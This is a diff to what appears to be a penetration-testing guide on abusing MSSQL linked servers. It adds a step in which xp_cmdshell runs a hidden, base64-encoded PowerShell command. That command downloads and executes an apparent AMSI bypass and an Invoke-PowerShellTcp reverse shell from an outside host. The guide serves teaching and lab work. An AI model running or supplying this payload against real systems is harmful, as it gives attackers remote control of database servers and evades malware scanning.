@@ -182,11 +182,19 @@ EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "DATA01.SECURE.LOCAL"
 EXECUTE('exec master..xp_cmdshell ''whoami''') AT "DATA01.SECURE.LOCAL"
 ```
 
+![](<../../../.gitbook/assets/afbeelding (44) (1).png>)
+
+11\. We could get a reverse shell by executing the following query using the technique from:
+
+{% content-ref url="../../misc/reverse-shell-trick.md" %}
+[reverse-shell-trick.md](../../misc/reverse-shell-trick.md)
+{% endcontent-ref %}
+
+```
+EXECUTE('exec master..xp_cmdshell ''powershell.exe -w hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANAA4AC4AMgA6ADgAMAA5ADAALwBhAG0AcwBpAC4AdAB4AHQAIgApADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=''') AT "DATA01.SECURE.LOCAL"
+```
+
 ![](<../../../.gitbook/assets/afbeelding (44).png>)
-
-11\. We could get a reverse shell by executing the following query:
-
-
 
 ## Defending
 
